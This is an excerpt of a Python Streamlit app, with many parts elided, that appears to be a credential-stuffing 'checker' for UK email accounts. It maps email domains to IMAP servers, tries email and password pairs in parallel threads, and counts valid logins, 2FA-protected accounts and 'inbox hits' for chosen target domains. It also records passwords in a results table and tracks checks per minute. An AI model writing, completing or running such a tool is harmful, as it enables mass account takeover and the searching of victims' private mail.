...
# 🇬🇧 COMPLETE UK IMAP SERVERS — ALL COMMON UK PROVIDERS ONLY
IMAP_SERVERS = {
    # === VIRGIN MEDIA GROUP ===
...
def get_imap_server(email):
    ...
    return IMAP_SERVERS.get(domain, None) # Returns None if domain not found
...
def check_single_account(email_addr, password, search_domains):
    ...
    if not server:
        return ("UNKNOWN_DOMAIN", 0) # Domain not in UK list
...
if start_btn and input_text:
    ...
    if unknown_domains:
        st.warning(f"⚠️ {len(unknown_domains)} emails use unknown domains — will be marked as UNKNOWN_DOMAIN")
    
    if target_domains:
        st.info(f"Loaded **{total}** accounts — searching for **{len(target_domains)} domains** in inboxes...")
    else:
    ...
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_acc = {
            executor.submit(check_single_account, e, p, target_domains): (e, p)
            for e, p in accounts
        }
        for future in as_completed(future_to_acc):
            ...
            results_data.append([email_addr, IMAP_SERVERS.get(get_imap_server(email_addr), "N/A"), password, result, hits])

            progress_bar.progress(checked / total)
            elapsed = time.time() - start_time
            cpm = round((checked / elapsed) * 60) if elapsed > 0 else 0
            ch_p.metric("Checked", checked)
            v_p.metric("Valid", valid)
            ih_p.metric("Inbox OK", inbox_hit)
            tf_p.metric("2FA", two_fa)
            inv_p.metric("Invalid", invalid)
            unk_p.metric("Unknown", unknown)
            dom_p.metric("Domain Hits", total_domain_hits)

    st.success("✅ CHECK COMPLETE!")
    st.subheader("📊 Final Results")
    col1, col2, col3, col4, col5, col6, col7 = st.columns(7)
    col1.metric("Total", checked)
    col2.metric("Valid", valid)
    col3.metric("Inbox OK", inbox_hit)
    col4.metric("2FA", two_fa)
    col5.metric("Invalid", invalid)
    col6.metric("Unknown Domain", unknown)
    col7.metric("Total Domain Hits", total_domain_hits)
